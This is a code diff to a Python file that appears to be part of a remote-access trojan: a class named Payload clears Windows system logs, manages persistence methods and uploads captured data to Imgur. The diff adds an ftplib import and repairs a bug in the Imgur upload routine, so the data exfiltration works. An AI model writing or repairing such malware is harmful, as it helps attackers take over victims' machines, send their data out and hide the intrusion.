@@ -11,6 +11,7 @@ import zlib
 import uuid
 import base64
 import ctypes
+import ftplib
 import struct
 import socket
 import random
@@ -25,6 +26,7 @@ import subprocess
 import contextlib
 import collections
 import logging.handlers
+
 
 def log(info, level='debug'):
     logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
@@ -480,6 +482,7 @@ class Payload():
             if os.name is 'nt':
                 clear_system_logs()
             if 'persistence' in globals():
+                global persistence
                 for method in persistence.methods:
                     if persistence.methods[method].get('established'):
                         try:
@@ -549,11 +552,11 @@ class Payload():
             if api_key:
                 if not isinstance(api_key, str):
                     raise TypeError("argument 'api_key' data type must be: {}".format(str))
-                if not api.lower().startswith('client-id'):
-                    api  = 'Client-ID {}'.format(api_key)
+                if not api_key.lower().startswith('client-id'):
+                    api_key  = 'Client-ID {}'.format(api_key)
                 if 'normalize' in globals():
                     source = normalize(source)
-                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(source), 'type': 'base64'})
+                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
                 return str(json.loads(post)['data']['link'])
             else:
                 return "No Imgur API Key found"
